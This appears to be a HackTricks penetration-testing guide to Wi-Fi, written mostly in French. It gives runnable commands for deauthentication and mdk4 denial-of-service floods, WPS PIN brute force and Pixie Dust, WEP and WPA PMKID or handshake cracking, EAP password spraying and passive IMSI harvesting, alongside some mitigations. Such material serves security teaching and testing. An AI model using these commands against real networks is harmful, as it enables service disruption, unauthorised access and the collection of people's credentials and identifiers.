# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Commandes de base Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Outils

### Hijacker & NexMon (Wi-Fi interne d'Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Exécuter airgeddon avec docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Il peut effectuer des attaques Evil Twin, KARMA et Known Beacons, puis utiliser un template de phishing pour obtenir le mot de passe réel du réseau ou capturer des identifiants de réseaux sociaux.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Cet outil automatise les attaques **WPS/WEP/WPA-PSK**. Il va automatiquement :

- Place l'interface en monitor mode
- Scanne les réseaux possibles -- et vous permet de sélectionner la/les victime(s)
- Si WEP -- Lance des attaques WEP
- Si WPA-PSK
- Si WPS: Pixie dust attack and the bruteforce attack (be careful the brute-force attack could take a long time). Notice that it doesn't try null PIN or database/generated PINs.
- Tente de capturer le PMKID depuis l'AP pour le cracker
- Tente de deauthenticate les clients de l'AP pour capturer un handshake
- Si PMKID ou Handshake, tente de bruteforce en utilisant top5000 passwords.

## Résumé des attaques

- **DoS**
- Deauthentication/disassociation -- Disconnect everyone (or a specific ESSID/Client)
- Random fake APs -- Masque des réseaux, peut faire planter des scanners
- Overload AP -- Try to kill the AP (usually not very useful)
- WIDS -- Play with the IDS
- TKIP, EAPOL -- Some specific attacks to DoS some APs
- **Cracking**
- Crack **WEP** (plusieurs outils et méthodes)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (avec ou sans DoS)
- **Open** Evil Twin \[+ DoS] -- Utile pour capturer des captive portal creds et/ou effectuer des attaques LAN
- **WPA-PSK** Evil Twin -- Utile pour des attaques réseau si vous connaissez le mot de passe
- **WPA-MGT** -- Utile pour capturer des credentials d'entreprise
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Utile pour capturer des captive portal creds et/ou effectuer des attaques LAN
- **+ WPA** -- Utile pour capturer des WPA handshakes

## Notes rapides sur les réseaux Open / OWE

- **Passive capture** sur les SSID ouverts fonctionne toujours avec monitor mode et tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) effectue un échange de clés par station (pas de PSK), donc les trames radio sont chiffrées même sur des SSID "open". Étant basé sur WPA3, il applique aussi **802.11w PMF**, qui bloque les trames de deauth/disassoc usurpées.
- OWE **does not authenticate** les appareils qui rejoignent : n'importe qui peut s'associer, donc **vérifiez l'isolation des clients** au lieu de vous fier aux affirmations marketing. Sans isolation, l'ARP spoofing ou le responder-style poisoning sur le L2 local fonctionnent toujours.
- **Evil Twin** reste possible sur des SSID open/OWE en présentant un signal plus fort ; PMF supprime juste le raccourci de deauth. Si les victimes acceptent un certificat TLS forgé, un MitM HTTP(S) complet est récupéré.
- Le broadcast poisoning sur un guest Wi-Fi open fournit facilement des creds/hashes (LLMNR/NBT-NS/mDNS). Voir :

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Description tirée de** [**ici**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, a prevalent method in Wi-Fi hacking, involve forging "management" frames to **forcefully disconnect devices from a network**. These unencrypted packets deceive clients into believing they are from the legitimate network, enabling attackers to collect WPA handshakes for cracking purposes or to persistently disrupt network connections. This tactic, alarming in its simplicity, is widely used and has significant implications for network security.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 signifie deauthentication
- 1 est le nombre de deauths à envoyer (vous pouvez en envoyer plusieurs si vous le souhaitez) ; 0 signifie les envoyer en continu
- -a 00:14:6C:7E:40:80 est la MAC address de l'access point
- -c 00:0F:B5:34:30:30 est la MAC address du client à deauthenticate ; si ceci est omis alors broadcast deauthentication est envoyé (ne fonctionne pas toujours)
- ath0 est l'interface name

### Disassociation Packets

**Disassociation packets**, similaires aux deauthentication packets, sont un type de management frame utilisé dans les réseaux Wi-Fi. Ces paquets servent à rompre la connexion entre un appareil (comme un laptop ou un smartphone) et un access point (AP). La principale distinction entre disassociation et deauthentication réside dans leurs scénarios d'utilisation. Tandis qu'un AP émet **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, redémarrage ou déplacement, nécessitant ainsi la déconnexion de tous les nœuds connectés.

**Cette attaque peut être effectuée par mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Plus d'attaques DOS par mdk4**

**Voir** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envoie des beacon frames pour afficher de faux APs auprès des clients. Cela peut parfois faire planter les network scanners et même les drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Envoyer des authentication frames à tous les Access Points (APs) accessibles à portée peut surcharger ces APs, surtout lorsque de nombreux clients sont présents. Ce trafic intense peut provoquer une instabilité du système, amenant certains APs à se figer ou même à redémarrer.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Le probing des Access Points (APs) vérifie si un SSID est correctement révélé et confirme la portée de l'AP. Cette technique, combinée au **bruteforcing des SSIDs cachés** avec ou sans wordlist, aide à identifier et à accéder aux réseaux dissimulés.

**ATTACK MODE m: Michael Countermeasures Exploitation**

L'envoi de paquets aléatoires ou dupliqués vers différentes files QoS peut déclencher Michael Countermeasures sur **TKIP APs**, entraînant l'arrêt de l'AP pendant une minute. Cette méthode est une tactique d'attaque efficace **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

En inondant un AP avec des EAPOL Start frames, on crée des sessions factices, submergeant l'AP et empêchant les clients légitimes. Alternativement, l'injection de fausses EAPOL Logoff messages déconnecte de force les clients ; les deux méthodes perturbent efficacement le service réseau.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attaques pour les réseaux maillés IEEE 802.11s**

Diverses attaques sur la gestion des liens et le routage dans les réseaux maillés.

**ATTACK MODE w: WIDS Confusion**

Le raccordement croisé de clients à plusieurs WDS nodes ou à de faux rogue APs peut manipuler Intrusion Detection and Prevention Systems, créant de la confusion et un possible abus du système.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Un packet fuzzer proposant diverses sources de paquets et un ensemble complet de modificateurs pour la manipulation des paquets.

### **Airggedon**

_**Airgeddon**_ propose la plupart des attaques évoquées précédemment :

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) simplifie le processus de connexion des appareils à un routeur, accélérant et facilitant la configuration pour les réseaux chiffrés avec **WPA** ou **WPA2** Personal. Il est inefficace pour la sécurité WEP, facilement compromise. WPS utilise un PIN de 8 chiffres, validé en deux moitiés, ce qui le rend vulnérable aux attaques par brute-force en raison du nombre limité de combinaisons (11,000 possibilités).

### WPS Bruteforce

Il existe 2 outils principaux pour effectuer cette action : Reaver et Bully.

- **Reaver** a été conçu pour être une attaque robuste et pratique contre WPS, et a été testé sur une grande variété d'access points et d'implémentations WPS.
- **Bully** est une **nouvelle implémentation** de l'attaque WPS brute force, écrite en C. Elle présente plusieurs avantages par rapport au code original de reaver : moins de dépendances, meilleures performances mémoire et cpu, gestion correcte de l'endianness, et un ensemble d'options plus robuste.

L'attaque exploite la **vulnérabilité du WPS PIN**, notamment la divulgation des quatre premiers chiffres et le rôle du dernier chiffre comme checksum, facilitant l'attaque par brute-force. Cependant, des défenses contre les attaques par brute-force, comme le **blocage des MAC addresses** des attaquants agressifs, exigent une **rotation des MAC addresses** pour poursuivre l'attaque.

En obtenant le WPS PIN avec des outils comme Bully ou Reaver, l'attaquant peut déduire le WPA/WPA2 PSK, assurant un **accès persistant au réseau**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Cette approche affinée cible les WPS PINs en exploitant des vulnérabilités connues :

1. **PINs pré-découverts** : Utiliser une base de données de PINs connus associée à des fabricants spécifiques connus pour utiliser des WPS PINs uniformes. Cette base de données met en corrélation les trois premiers octets des MAC-addresses avec les PINs probables pour ces fabricants.
2. **Algorithmes de génération de PINs** : S'appuyer sur des algorithmes comme ComputePIN et EasyBox, qui calculent les WPS PINs à partir de la MAC-address de l'AP. L'algorithme Arcadyan requiert en outre un device ID, ajoutant une couche au processus de génération de PINs.

### WPS Pixie Dust attack

**Dominique Bongard** a découvert une faille dans certains Access Points (APs) concernant la génération de codes secrets, appelés **nonces** (**E-S1** et **E-S2**). Si ces nonces peuvent être déterminés, craquer le WPS PIN de l'AP devient facile. L'AP révèle le PIN dans un code spécial (hash) pour prouver qu'il est légitime et non un AP falsifié (rogue). Ces nonces sont essentiellement les "clés" permettant d'ouvrir le "coffre" qui contient le WPS PIN. Plus d'informations sont disponibles [ici](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

En termes simples, le problème est que certains APs n'utilisaient pas des clés suffisamment aléatoires pour chiffrer le PIN pendant le processus de connexion. Cela rend le PIN vulnérable à être deviné depuis l'extérieur du réseau (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si vous ne voulez pas passer l'appareil en monitor mode, ou si `reaver` et `bully` posent problème, vous pouvez essayer [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Cet outil peut effectuer une Pixie Dust attack sans avoir à passer en monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Certains systèmes mal conçus permettent même qu'un **Null PIN** (un PIN vide ou inexistant) accorde l'accès, ce qui est assez inhabituel. L'outil **Reaver** est capable de tester cette vulnérabilité, contrairement à **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 vous permettent d'essayer **votre PIN personnalisé** (si vous en avez un)
- 7 and 8 exécutent l'**attaque Pixie Dust**
- 13 vous permet de tester le **NULL PIN**
- 11 and 12 **recollect the PINs related to the selected AP from available databases** et **génèrent** des **PINs** possibles en utilisant : ComputePIN, EasyBox et éventuellement Arcadyan (recommandé, pourquoi pas ?)
- 9 and 10 testeront **tous les PIN possibles**

## **WEP**

**Pourquoi il s'effondre**

- RC4 seed is just **IV (24 bits) + shared key**. L'IV est en clair, petit (2^24), et se répète rapidement, donc les ciphertexts avec le même IV réutilisent le keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) let you “vote” key bytes. **PTW** optimise cela en utilisant le trafic ARP pour réduire les besoins à des dizaines de milliers de packets au lieu de millions.
- Integrity is only **CRC32** (linéaire/sans clé), donc un attaquant peut inverser des bits et recalculer CRC32 sans la clé → packet forgery/replay/ARP injection en attendant des IVs.

Practical break is deterministic:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon still ships an "All-in-One" WEP workflow if you prefer a guided UI.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a introduit une nouvelle méthode d'attaque, unique car elle nécessite seulement **un seul paquet** et ne requiert aucun client connecté à l'AP cible — seulement une interaction entre l'attaquant et l'AP.

De nombreux routeurs modernes ajoutent un **champ optionnel** au **premier cadre EAPOL** lors de l'association, connu sous le nom de `Robust Security Network`. Ceci inclut le `PMKID`.

Comme l'explique le post original, le **PMKID** est créé en utilisant des données connues :
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Étant donné que le "PMK Name" est constant, que nous connaissons le BSSID de l'AP et de la station, et que le `PMK` est identique à celui d'une full 4-way handshake, **hashcat** peut utiliser ces informations pour crack le PSK et récupérer la passphrase !

Pour **récupérer** ces informations et **bruteforce** localement le mot de passe, vous pouvez faire :
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Les **PMKIDs captured** seront affichés dans la **console** et aussi **enregistrés** dans \_ **/tmp/attack.pcap**\_\
Maintenant, convertissez la capture au format **hashcat/john** et crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Veuillez noter que le format d'un hash correct contient **4 parties**, comme : `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si le vôtre ne contient **que** **3 parties**, alors il est **invalide** (la capture PMKID n'était pas valide).

Notez que `hcxdumptool` **capture aussi des handshakes** (quelque chose comme ceci apparaîtra : **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Vous pouvez **transformer** les **handshakes** au format **hashcat**/**john** en utilisant `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_J'ai remarqué que certains handshakes capturés avec cet outil n'ont pas pu être cracked même en connaissant le mot de passe correct. Je recommande de capturer des handshakes aussi de manière traditionnelle si possible, ou d'en capturer plusieurs avec cet outil._

### Capture de handshake

Une attaque sur les réseaux **WPA/WPA2** peut être exécutée en capturant un **handshake** et en tentant de **crack** le mot de passe **offline**. Ce processus implique de surveiller la communication d'un réseau spécifique et le **BSSID** sur un **channel** particulier. Voici un guide simplifié :

1. Identifiez le **BSSID**, le **channel**, et un **connected client** du réseau cible.
2. Utilisez `airodump-ng` pour surveiller le trafic réseau sur le **channel** et le **BSSID** spécifiés, en espérant capturer un **handshake**. La commande ressemblera à ceci:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Pour augmenter la probabilité de capturer un handshake, déconnecter momentanément le client du réseau pour forcer une ré-authentification. Cela peut être fait en utilisant la commande `aireplay-ng`, qui envoie des deauthentication packets au client :
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Notez que, comme le client a été deauthenticated, il pourrait essayer de se connecter à un AP différent ou, dans d'autres cas, à un réseau différent._

Une fois que des informations de handshake apparaissent dans `airodump-ng`, cela signifie que le handshake a été capturé et vous pouvez arrêter d'écouter :

![](<../../images/image (172) (1).png>)

Une fois le handshake capturé, vous pouvez **crack** le avec `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Vérifier si le handshake est présent dans le fichier

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si cet outil trouve un handshake incomplet d'un ESSID avant celui complété, il ne détectera pas celui qui est valide._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Deviner le PSK en ligne plus rapidement via `wpa_supplicant` ctrl socket (pas de clients/PMKID)

Quand il n'y a pas de clients et que l'AP refuse PMKID, vous pouvez itérer les PSKs en ligne sans relancer les supplicants :

- Appliquez un patch à `wpa_supplicant.c` pour forcer `dur = 0;` dans la logique de backoff des échecs d'authentification (autour de `ssid->auth_failures`), désactivant effectivement le timer temporary-disable.
- Lancez un seul daemon avec un control socket :
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Pilotez-le via l'interface de contrôle, en réutilisant le même scan et network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Une petite boucle Python lisant les événements de socket (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) peut tester ~100 essais en ~5 minutes sans surcharge de scan. C'est toujours bruyant et détectable, mais évite les redémarrages de processus à chaque tentative et les délais de backoff.

## **WPA Enterprise (MGT)**

Dans les **installations WiFi d'entreprise, vous rencontrerez différentes méthodes d'authentification**, chacune offrant des niveaux de sécurité et des fonctionnalités de gestion différents. Lorsque vous utilisez des outils comme `airodump-ng` pour inspecter le trafic réseau, vous pouvez remarquer des identifiants pour ces types d'authentification. Quelques méthodes courantes incluent :
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Cette méthode prend en charge les hardware tokens et les one-time passwords au sein d'EAP-PEAP. Contrairement à MSCHAPv2, elle n'utilise pas de peer challenge et envoie les passwords en clair à l'access point, ce qui présente un risque pour les downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Implique l'envoi du hash MD5 du password depuis le client. Il n'est **pas recommandé** en raison de sa vulnérabilité aux attaques par dictionnaire, de l'absence d'authentification du serveur et de son incapacité à générer des WEP keys spécifiques à la session.
3. **EAP-TLS (Transport Layer Security)**:
- Utilise à la fois des certificats côté client et côté serveur pour l'authentification et peut générer dynamiquement des WEP keys basées sur l'utilisateur et la session pour sécuriser les communications.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fournit une authentification mutuelle via un tunnel chiffré, ainsi qu'une méthode pour dériver des WEP keys dynamiques, par utilisateur et par session. Il nécessite uniquement des certificats côté serveur, les clients utilisant des credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Fonctionne de manière similaire à EAP en créant un tunnel TLS pour une communication protégée. Il permet l'utilisation de protocols d'authentification plus faibles au-dessus d'EAP grâce à la protection offerte par le tunnel.
- **PEAP-MSCHAPv2**: Souvent appelé PEAP, il combine le mécanisme challenge/response vulnérable de MSCHAPv2 avec un tunnel TLS protecteur.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Similaire à EAP-TLS mais initie un tunnel TLS avant l'échange des certificats, offrant une couche supplémentaire de sécurité.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

En lisant [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) il semble que si vous utilisez **EAP** les **"Identity"** **messages** doivent être **supportés**, et le **username** va être envoyé **en clair** dans les **"Response Identity"** messages.

Même en utilisant l'une des méthodes d'authentification les plus sécurisées : **PEAP-EAP-TLS**, il est possible de **capture the username sent in the EAP protocol**. Pour ce faire, **capture a authentication communication** (lancer `airodump-ng` sur un channel et `wireshark` sur la même interface) et filtrer les paquets par `eapol`.\
À l'intérieur du paquet "**Response, Identity**", le **username** du client apparaîtra.

![](<../../images/image (850).png>)

### Anonymous Identities

Le masquage d'identité est supporté par EAP-PEAP et EAP-TTLS. Dans le contexte d'un réseau WiFi, une requête EAP-Identity est typiquement initiée par l'access point (AP) durant le processus d'association. Pour assurer la protection de l'anonymat des utilisateurs, la réponse du client EAP sur l'appareil de l'utilisateur contient seulement les informations essentielles requises pour que le RADIUS initial puisse traiter la requête. Ce concept est illustré par les scénarios suivants :

- EAP-Identity = anonymous
- Dans ce scénario, tous les utilisateurs utilisent le pseudonyme "anonymous" comme identifiant utilisateur. Le RADIUS initial agit en tant que serveur EAP-PEAP ou EAP-TTLS, responsable de la gestion du côté serveur du protocol PEAP ou TTLS. La méthode d'authentification interne (protected) est ensuite soit gérée localement soit déléguée à un RADIUS distant (home).
- EAP-Identity = anonymous@realm_x
- Dans cette situation, les utilisateurs de différents realms cachent leur identité tout en indiquant leur realm respectif. Cela permet au RADIUS initial de proxyer les requêtes EAP-PEAP ou EAP-TTLS vers les serveurs RADIUS de leurs realms d'origine, qui agissent comme serveur PEAP ou TTLS. Le RADIUS initial fonctionne uniquement comme un nœud relais RADIUS.
- Alternativement, le RADIUS initial peut fonctionner comme serveur EAP-PEAP ou EAP-TTLS et soit gérer la méthode d'authentification protégée soit la transférer à un autre serveur. Cette option facilite la configuration de politiques distinctes pour différents realms.

Dans EAP-PEAP, une fois le tunnel TLS établi entre le serveur PEAP et le client PEAP, le serveur PEAP initie une requête EAP-Identity et la transmet à travers le tunnel TLS. Le client répond à cette seconde requête EAP-Identity en envoyant une response EAP-Identity contenant la véritable identité de l'utilisateur à travers le tunnel chiffré. Cette approche empêche efficacement la révélation de la véritable identité de l'utilisateur à quiconque écoute passivement le trafic 802.11.

EAP-TTLS suit une procédure légèrement différente. Avec EAP-TTLS, le client s'authentifie typiquement en utilisant PAP ou CHAP, sécurisé par le tunnel TLS. Dans ce cas, le client inclut un attribut User-Name et soit un attribut Password soit CHAP-Password dans le message TLS initial envoyé après l'établissement du tunnel.

Quel que soit le protocole choisi, le serveur PEAP/TTLS obtient la connaissance de la véritable identité de l'utilisateur après que le tunnel TLS a été établi. La véritable identité peut être représentée comme user@realm ou simplement user. Si le serveur PEAP/TTLS est également responsable de l'authentification de l'utilisateur, il possède désormais l'identité de l'utilisateur et procède avec la méthode d'authentification protégée par le tunnel TLS. Alternativement, le serveur PEAP/TTLS peut transmettre une nouvelle requête RADIUS au RADIUS home de l'utilisateur. Cette nouvelle requête RADIUS omet la couche PEAP ou TTLS. Dans les cas où la méthode protégée est EAP, les messages EAP internes sont transmis au RADIUS home sans l'enveloppe EAP-PEAP ou EAP-TTLS. L'attribut User-Name du message RADIUS sortant contient la véritable identité de l'utilisateur, remplaçant le User-Name anonymous de la requête RADIUS entrante. Lorsque la méthode protégée est PAP ou CHAP (supportée uniquement par TTLS), le User-Name et les autres attributs d'authentification extraits de la charge TLS sont substitués dans le message RADIUS sortant, remplaçant le User-Name anonymous et les attributs TTLS EAP-Message trouvés dans la requête RADIUS entrante.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Cliquez pour développer</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Remarques :
- Fonctionne avant tout tunnel TLS si le déploiement utilise EAP‑SIM/AKA nu sans identité protégée/pseudonymes.
- La valeur exposée est un identifiant permanent lié à la SIM de l’abonné ; sa collecte permet un suivi à long terme et des abus télécom en aval.

Impact
- Confidentialité : suivi persistant des utilisateurs/appareils à partir de captures Wi‑Fi passives dans les lieux publics.
- Point d'entrée pour les abus télécom : avec l'IMSI, un attaquant disposant d'accès SS7/Diameter peut interroger la localisation ou tenter une interception d'appels/SMS et le vol de MFA.

Mesures d'atténuation / éléments à vérifier
- Vérifier que les clients utilisent des identités externes anonymes (pseudonymes) pour EAP‑SIM/AKA conformément aux recommandations 3GPP (p.ex., 3GPP TS 33.402).
- Préférer le tunneling de la phase d'identité (p.ex., EAP‑TTLS/PEAP transportant un EAP‑SIM/AKA interne) afin que l'IMSI ne soit jamais envoyé en clair.
- Les captures de paquets d'association/auth ne doivent jamais révéler un IMSI brut dans EAP-Response/Identity.

Lié : Exploitation de la signalisation télécom avec des identifiants mobiles capturés
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Si le client est censé utiliser un **nom d'utilisateur et mot de passe** (notez que **EAP-TLS won't be valid** dans ce cas), alors vous pouvez essayer d'obtenir une **liste** de **noms d'utilisateur** (voir la partie suivante) et de **mots de passe** et tenter de **bruteforcer** l'accès en utilisant [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Vous pouvez également effectuer cette attack en utilisant `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Théorie des attaques côté client

### Sélection du réseau et itinérance

- Le protocole 802.11 définit comment une station rejoint un Extended Service Set (ESS) mais ne précise pas les critères de sélection d'un ESS ni d'un access point (AP) à l'intérieur de celui-ci.
- Les stations peuvent effectuer de l'itinérance entre des APs partageant le même ESSID, maintenant la connectivité à travers un bâtiment ou une zone.
